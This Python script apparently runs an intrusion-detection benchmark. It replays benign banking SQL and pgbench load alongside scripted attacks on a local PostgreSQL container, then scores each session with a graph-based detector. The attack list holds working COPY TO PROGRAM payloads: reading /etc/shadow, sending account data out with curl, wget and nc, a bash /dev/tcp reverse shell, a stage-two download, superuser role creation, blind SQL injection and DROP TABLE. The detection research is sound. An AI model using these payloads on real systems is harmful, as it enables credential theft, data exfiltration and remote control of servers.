#!/usr/bin/env python3
"""
run_intermixed_experiment.py
============================
Executes Experiment 3: Full Intermixed Real-Time Environment Benchmark
- Concurrently runs background pgbench traffic (-C session-per-tx, ~3 TPS) against casce_tpcb
- Intermixes foreground seen and unseen normal banking activities
- Intermixes attacks across all 4 threat categories:
    * Class 1: Privilege Abuse & Escalation
    * Class 2: Data Exfiltration
    * Class 3: SQL Injection & Sabotage
    * Class 4: Multi-Stage APT Scenarios
- Records dual-plane telemetry in real-time via logger.sh (eBPF + pg_telemetry hook)
- Correlates sessions (Algorithm 1) and synthesizes provenance graphs (Algorithm 2)
- Enriches with MITRE ATT&CK behaviors (Algorithm 3)
- Evaluates with PyG HeteroGAT ensemble (casce_gat_v3p_ens2) at theta_A = 0.55 (Algorithm 4)
- Computes complete confusion matrix: TP, TN, FP, FN, Precision, Recall, Specificity, F1, FPR, Latencies.
"""

from __future__ import annotations

import csv
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Any

import networkx as nx

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))
sys.path.insert(0, str(REPO_ROOT / "individual_simulation"))

import algorithm_1
import algorithm2
import algorithm_3_abstract
import algorithm_4_hybrid
from main import sanitize_for_graphml

WORKSPACE_HOST = Path("/home/adithyan/Desktop/Projects/CASCE_DATASET")
CONTAINER = "casce_environment"
OUT_DIR = REPO_ROOT / "individual_simulation" / "intermixed_pgbench_experiment"


def run_cmd(cmd: List[str] | str, check: bool = True, shell: bool = False) -> subprocess.CompletedProcess:
    if isinstance(cmd, list) and not shell:
        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    else:
        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if check and res.returncode != 0:
        raise RuntimeError(f"Command failed (exit {res.returncode}):\nSTDOUT: {res.stdout}\nSTDERR: {res.stderr}")
    return res


def logger_archive_and_start():
    print("[logger] Archiving old captures and starting dual-plane logger...")
    run_cmd(f"docker exec -u root {CONTAINER} bash /dataset_workspace/logger.sh archive", shell=True)
    run_cmd(f"docker exec -u root {CONTAINER} bash /dataset_workspace/logger.sh start", shell=True)
    time.sleep(3)


def logger_stop():
    print("[logger] Stopping dual-plane logger...")
    run_cmd(f"docker exec -u root {CONTAINER} bash /dataset_workspace/logger.sh stop", shell=True)
    time.sleep(2)


def reset_database_state():
    sql = """
    DROP ROLE IF EXISTS hacker;
    DROP ROLE IF EXISTS stealth_hacker;
    DROP ROLE IF EXISTS sqli_admin;
    CREATE TABLE IF NOT EXISTS transactions (
        transaction_id SERIAL PRIMARY KEY,
        account_id INT NOT NULL,
        amount NUMERIC(12, 2) NOT NULL,
        transaction_type VARCHAR(20) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
    """
    run_cmd(f'docker exec {CONTAINER} psql -U postgres -d casce_banking -c "{sql}"', shell=True)


# Foreground Scenarios to intermix
FOREGROUND_SCENARIOS = [
    # 1. Normal Banking (Seen)
    {
        "type": "benign",
        "category": "Seen Normal",
        "label": "Benign:teller_balance_1",
        "role": "teller",
        "db": "casce_banking",
        "sql": "SELECT account_id, balance FROM accounts WHERE account_id = 101;",
    },
    {
        "type": "benign",
        "category": "Seen Normal",
        "label": "Benign:teller_deposit_1",
        "role": "teller",
        "db": "casce_banking",
        "sql": "BEGIN; UPDATE accounts SET balance = balance + 150.00 WHERE account_id = 102; INSERT INTO transactions (account_id, amount, transaction_type) VALUES (102, 150.00, 'deposit'); COMMIT;",
    },
    # 2. Attack: Class 1 (Privilege Abuse & Escalation)
    {
        "type": "attack",
        "category": "Class 1: Privilege Abuse & Escalation",
        "label": "Malicious:os_cat_shadow",
        "role": "dba",
        "db": "casce_banking",
        "sql": "COPY (SELECT 1) TO PROGRAM 'cat /etc/shadow >/dev/null 2>&1 || true';",
    },
    # 3. Normal Banking (Seen)
    {
        "type": "benign",
        "category": "Seen Normal",
        "label": "Benign:branch_revenue_report",
        "role": "branch_manager",
        "db": "casce_banking",
        "sql": "SELECT branch_id, count(*), sum(balance) FROM accounts GROUP BY branch_id;",
    },
    # 4. Attack: Class 2 (Data Exfiltration)
    {
        "type": "attack",
        "category": "Class 2: Data Exfiltration",
        "label": "Malicious:exfil_gzip_curl",
        "role": "teller",
        "db": "casce_banking",
        "sql": "COPY (SELECT * FROM accounts LIMIT 20) TO PROGRAM 'gzip > /tmp/exfil_gzip_curl.dat && curl -s -X POST -d @/tmp/exfil_gzip_curl.dat http://127.0.0.1:9090 2>/dev/null || true';",
    },
    # 5. Normal Banking (Unseen - KYC Join)
    {
        "type": "benign",
        "category": "Unseen Normal",
        "label": "Benign:compliance_kyc_audit",
        "role": "compliance_officer",
        "db": "casce_banking",
        "sql": "SELECT c.customer_id, c.full_name, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE a.balance > 100000 LIMIT 5;",
    },
    # 6. Attack: Class 1 (Privilege Tampering)
    {
        "type": "attack",
        "category": "Class 1: Privilege Abuse & Escalation",
        "label": "Malicious:os_chmod_tmp",
        "role": "dba",
        "db": "casce_banking",
        "sql": "COPY (SELECT 1) TO PROGRAM 'chmod 777 /tmp 2>/dev/null || true';",
    },
    # 7. Attack: Class 3 (SQL Injection / Blind Sleep)
    {
        "type": "attack",
        "category": "Class 3: SQL Injection & Sabotage",
        "label": "Malicious:sqli_time_blind",
        "role": "teller",
        "db": "casce_banking",
        "sql": "SELECT account_id, balance FROM accounts WHERE account_id = 1 AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(0.5) ELSE 0 END);",
    },
    # 8. Normal Banking (Unseen - BI Export via curl)
    {
        "type": "benign",
        "category": "Unseen Normal",
        "label": "Benign:bi_export_curl",
        "role": "branch_manager",
        "db": "casce_banking",
        "sql": "COPY (SELECT branch_id, sum(balance) FROM accounts GROUP BY branch_id) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:8080/bi_ingest 2>/dev/null || true';",
    },
    # 9. Attack: Class 2 (Data Exfiltration - bzip2 + wget)
    {
        "type": "attack",
        "category": "Class 2: Data Exfiltration",
        "label": "Malicious:exfil_bzip2_wget",
        "role": "teller",
        "db": "casce_banking",
        "sql": "COPY (SELECT * FROM accounts LIMIT 20) TO PROGRAM 'bzip2 > /tmp/exfil_bzip.dat && wget -q --post-file=/tmp/exfil_bzip.dat http://127.0.0.1:9090 2>/dev/null || true';",
    },
    # 10. Attack: Class 4 (Interactive Reverse Shell)
    {
        "type": "attack",
        "category": "Class 4: Multi-Stage APT Scenarios",
        "label": "Malicious:reverse_shell",
        "role": "dba",
        "db": "casce_banking",
        "sql": "COPY (SELECT 1) TO PROGRAM 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/dev/null || true';",
    },
    # 11. Normal Banking (Unseen - Nightly Audit Archive)
    {
        "type": "benign",
        "category": "Unseen Normal",
        "label": "Benign:audit_archive_gzip",
        "role": "dba",
        "db": "casce_banking",
        "sql": "COPY (SELECT * FROM audit_log LIMIT 50) TO PROGRAM 'gzip > /tmp/audit_nightly_backup.csv.gz 2>/dev/null || true';",
    },
    # 12. Attack: Class 1 (Superuser Role Escalation)
    {
        "type": "attack",
        "category": "Class 1: Privilege Abuse & Escalation",
        "label": "Malicious:sqli_create_role",
        "role": "dba",
        "db": "casce_banking",
        "sql": "CREATE ROLE sqli_admin WITH LOGIN SUPERUSER PASSWORD 'pwned'; SELECT 1;",
    },
    # 13. Attack: Class 2 (Data Exfiltration - tar + netcat)
    {
        "type": "attack",
        "category": "Class 2: Data Exfiltration",
        "label": "Malicious:exfil_tar_nc",
        "role": "teller",
        "db": "casce_banking",
        "sql": "COPY (SELECT * FROM accounts LIMIT 20) TO PROGRAM 'tar -cf - /tmp/exfil_gzip_curl.dat 2>/dev/null | nc -w 1 127.0.0.1 9090 2>/dev/null || true';",
    },
    # 14. Attack: Class 4 (Multi-Stage APT)
    {
        "type": "attack",
        "category": "Class 4: Multi-Stage APT Scenarios",
        "label": "Malicious:multistage_apt",
        "role": "dba",
        "db": "casce_banking",
        "sql": "COPY (SELECT 1) TO PROGRAM 'uname -a && id && curl -s http://127.0.0.1:9090/stage2.sh 2>/dev/null || true';",
    },
    # 15. Attack: Class 3 (Sabotage Drop Table)
    {
        "type": "attack",
        "category": "Class 3: SQL Injection & Sabotage",
        "label": "Malicious:sabotage_drop_table",
        "role": "dba",
        "db": "casce_banking",
        "sql": "DROP TABLE IF EXISTS transactions; SELECT 1;",
    },
    # 16. Normal Banking (Seen - Vacuum)
    {
        "type": "benign",
        "category": "Seen Normal",
        "label": "Benign:dba_vacuum",
        "role": "dba",
        "db": "casce_banking",
        "sql": "VACUUM accounts;",
    },
]


def run_experiment():
    print("=" * 80)
    print("STARTING EXPERIMENT 3: INTERMIXED REAL-TIME LIVE BENCHMARK WITH PGBENCH")
    print("=" * 80)

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    reset_database_state()

    re_capture = "--re-capture" in sys.argv or not (OUT_DIR / "postgres_events.json").exists()
    if re_capture:
        # Step 1: Start dual-plane logger
        logger_archive_and_start()

        # Step 2: Launch background pgbench
        # Run pgbench for 45 seconds at rate 3.0 sessions/sec with -C (connection per session)
        PGBENCH_DURATION = 45
        PGBENCH_RATE = 3.0
        print(f"\n[pgbench] Launching background pgbench load ({PGBENCH_DURATION}s @ {PGBENCH_RATE} TPS, -C)...")
        pgbench_proc = subprocess.Popen(
            [
                "docker", "exec", "-u", "root",
                "-e", "PGAPPNAME=casce_label=Benign:pgbench",
                CONTAINER,
                "pgbench", "-h", "127.0.0.1", "-U", "postgres", "-n", "-C",
                "-c", "2", "-j", "1", "-R", str(PGBENCH_RATE),
                "-T", str(PGBENCH_DURATION), "casce_tpcb"
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        time.sleep(2)  # Give pgbench a moment to start generating concurrent sessions

        # Step 3: Concurrently intermix foreground banking transactions and attacks
        print("\n[foreground] Intermixing foreground activities across all 4 attack categories and normal operations...")
        for idx, scn in enumerate(FOREGROUND_SCENARIOS, start=1):
            lbl_val = scn['label']
            sql_escaped = scn["sql"].replace('"', '\\"')
            role_val = scn['role']
            db_val = scn['db']
            cmd = (
                f'docker exec {CONTAINER} bash -c '
                f'"PGAPPNAME=\\"casce_label={lbl_val}\\" '
                f'psql -X -q -h 127.0.0.1 -U {role_val} -d {db_val} '
                f'-c \\"{sql_escaped}\\" 2>&1 || true"'
            )
            run_cmd(cmd, shell=True)
            time.sleep(1.2)  # realistic inter-arrival delay

        print("\n[foreground] Completed all foreground transactions. Waiting for background pgbench to complete...")
        stdout, stderr = pgbench_proc.communicate()
        print("[pgbench] Finished. Summary:")
        for line in stdout.strip().splitlines():
            if line.startswith(("number of transactions actually processed", "tps", "latency average")):
                print(f"   {line}")

        # Step 4: Allow idle events to flush and stop logger
        print("\n[logger] Allowing idle events to settle (10s)...")
        time.sleep(10)
        logger_stop()

        # Step 5: Archive and copy captured telemetry
        print("\n[telemetry] Copying captured logs...")
        shutil.copy2(WORKSPACE_HOST / "postgres_events.json", OUT_DIR / "postgres_events.json")
        shutil.copy2(WORKSPACE_HOST / "kernel_events.json", OUT_DIR / "kernel_events.json")
        shutil.copy2(WORKSPACE_HOST / "session_labels.jsonl", OUT_DIR / "session_labels.jsonl")
    else:
        print("[telemetry] Using existing captured live telemetry files in OUT_DIR...")

    # Step 6: Correlate and synthesize graphs
    print("\n[pipeline] Running Algorithm 1 (Correlation & Clock Sync)...")
    master_log, correlated = algorithm_1.run_one(OUT_DIR)

    import tempfile
    with tempfile.TemporaryDirectory() as tmpdirname:
        tmp_root = Path(tmpdirname)
        algorithm_1.save_run_output("intermixed_run", master_log, correlated, tmp_root)
        event_table_path = tmp_root / "intermixed_run_event_table.json"
        correlation_path = tmp_root / "intermixed_run_session_correlation.csv"
        alg2_out = tmp_root / "alg2"

        # Load ground truth session labels
        session_labels = {}
        with open(OUT_DIR / "session_labels.jsonl") as f:
            for line in f:
                if line.strip():
                    item = json.loads(line)
                    session_labels[item["session_id"]] = item["label"]

        lbl_csv = tmp_root / "labels.csv"
        with open(lbl_csv, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["session_id", "label"])
            for sid, lbl in session_labels.items():
                writer.writerow([sid, lbl])

        print("[pipeline] Running Algorithm 2 (Heterogeneous Provenance Graph Synthesis)...")
        active_graphs, manifest_rows, orphans, parse_errs = algorithm2.run(
            event_table_path, correlation_path, alg2_out, "intermixed_run", lbl_csv
        )

        print(f"[pipeline] Synthesized {len(active_graphs)} session provenance graphs.")

        # Load models and rule templates
        print("[pipeline] Loading GAT Ensemble Model (casce_gat_v3p_ens2) & Behavior Templates...")
        model_path = REPO_ROOT / "casce_gat_v3p_ens2.json"
        model = algorithm_4_hybrid.load_model(str(model_path))
        templates = algorithm_3_abstract.initialize_templates()

        # Step 7: Score all sessions in real-time inference
        print("[pipeline] Scoring all intermixed sessions with Algorithm 3 & Algorithm 4...")
        session_results = []
        latencies = []

        tp, fn, fp, tn = 0, 0, 0, 0

        # Sub-breakdowns
        cat_stats = {
            "Class 1: Privilege Abuse & Escalation": {"TP": 0, "FN": 0, "FP": 0, "TN": 0},
            "Class 2: Data Exfiltration": {"TP": 0, "FN": 0, "FP": 0, "TN": 0},
            "Class 3: SQL Injection & Sabotage": {"TP": 0, "FN": 0, "FP": 0, "TN": 0},
            "Class 4: Multi-Stage APT Scenarios": {"TP": 0, "FN": 0, "FP": 0, "TN": 0},
            "Benign Banking": {"TP": 0, "FN": 0, "FP": 0, "TN": 0},
            "Benign pgbench": {"TP": 0, "FN": 0, "FP": 0, "TN": 0},
        }

        for sid, G_raw in active_graphs.items():
            lbl = session_labels.get(sid, "Benign:pgbench")
            is_attack = "Malicious" in lbl

            # Classify into reporting category
            assigned_cat = "Benign pgbench"
            if "pgbench" in lbl:
                assigned_cat = "Benign pgbench"
            elif "Benign:" in lbl:
                assigned_cat = "Benign Banking"
            else:
                for scn in FOREGROUND_SCENARIOS:
                    if scn["label"] == lbl:
                        assigned_cat = scn["category"]
                        break

            # Algorithm 3: Abstraction
            G_enriched, behaviors = algorithm_3_abstract.abstract_session_graph(G_raw, templates)
            G_enriched = sanitize_for_graphml(G_enriched)

            # Algorithm 4: Hybrid detection
            t0 = time.perf_counter()
            det = algorithm_4_hybrid.detect(G_enriched, model, session_id=sid, theta_a=0.55, theta_r=0.55)
            dt = time.perf_counter() - t0
            latencies.append(dt)

            is_alert = (det["status"] != "benign")

            if is_attack:
                if is_alert:
                    tp += 1
                    verdict = "TP"
                    cat_stats[assigned_cat]["TP"] += 1
                else:
                    fn += 1
                    verdict = "FN"
                    cat_stats[assigned_cat]["FN"] += 1
            else:
                if is_alert:
                    fp += 1
                    verdict = "FP"
                    cat_stats[assigned_cat]["FP"] += 1
                else:
                    tn += 1
                    verdict = "TN"
                    cat_stats[assigned_cat]["TN"] += 1

            session_results.append({
                "session_id": sid,
                "label": lbl,
                "category": assigned_cat,
                "is_attack": is_attack,
                "verdict": verdict,
                "status": det["status"],
                "risk_score": round(float(det.get("risk", det.get("risk_score", 0.0))), 4),
                "rule_score": round(float(det["rule_score"]), 4),
                "gat_score": round(float(det["gat_score"]), 4),
                "node_count": G_enriched.number_of_nodes(),
                "edge_count": G_enriched.number_of_edges(),
                "behaviors": behaviors,
                "latency_s": round(dt, 4),
            })

    total_attacks = tp + fn
    total_benign = fp + tn
    recall = tp / total_attacks if total_attacks > 0 else 1.0
    precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
    specificity = tn / total_benign if total_benign > 0 else 1.0
    fpr = fp / total_benign if total_benign > 0 else 0.0
    f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0

    sorted_lat = sorted(latencies)
    p50 = sorted_lat[len(sorted_lat) // 2] if sorted_lat else 0.0
    p90 = sorted_lat[int(len(sorted_lat) * 0.9)] if sorted_lat else 0.0
    p99 = sorted_lat[int(len(sorted_lat) * 0.99)] if sorted_lat else 0.0

    summary = {
        "experiment": "Experiment 3: Full Intermixed Live Environment with Background pgbench",
        "total_sessions": len(active_graphs),
        "total_attacks": total_attacks,
        "total_benign": total_benign,
        "confusion_matrix": {
            "TP": tp,
            "TN": tn,
            "FP": fp,
            "FN": fn,
        },
        "metrics": {
            "precision": round(precision, 4),
            "recall_tpr": round(recall, 4),
            "specificity_tnr": round(specificity, 4),
            "fpr": round(fpr, 4),
            "f1_score": round(f1, 4),
        },
        "latency_seconds": {
            "p50": round(p50, 4),
            "p90": round(p90, 4),
            "p99": round(p99, 4),
            "mean": round(sum(latencies) / len(latencies), 4) if latencies else 0.0,
        },
        "category_breakdown": cat_stats,
        "session_details": session_results,
    }

    summary_file = OUT_DIR / "intermixed_experiment_summary.json"
    with open(summary_file, "w") as f:
        json.dump(summary, f, indent=2)

    print("\n" + "=" * 80)
    print("EXPERIMENT 3 COMPLETE: RESULTS SUMMARY")
    print("=" * 80)
    print(f"Total Live Sessions Evaluated: {len(active_graphs)}")
    print(f"  - Benign Background (pgbench): {cat_stats['Benign pgbench']['TN'] + cat_stats['Benign pgbench']['FP']}")
    print(f"  - Benign Foreground Banking:  {cat_stats['Benign Banking']['TN'] + cat_stats['Benign Banking']['FP']}")
    print(f"  - Attack Sessions:            {total_attacks}")
    print("\nConfusion Matrix:")
    print(f"  TP: {tp}   FN: {fn}")
    print(f"  FP: {fp}   TN: {tn}")
    print(f"\nMetrics:")
    print(f"  Precision:   {precision * 100:.2f}%")
    print(f"  Recall (TPR):{recall * 100:.2f}%")
    print(f"  Specificity: {specificity * 100:.2f}%")
    print(f"  FPR:         {fpr * 100:.2f}%")
    print(f"  F1 Score:    {f1:.4f}")
    print(f"\nLatency:")
    print(f"  p50: {p50 * 1000:.2f} ms")
    print(f"  p90: {p90 * 1000:.2f} ms")
    print(f"  p99: {p99 * 1000:.2f} ms")
    print("=" * 80)


if __name__ == "__main__":
    run_experiment()
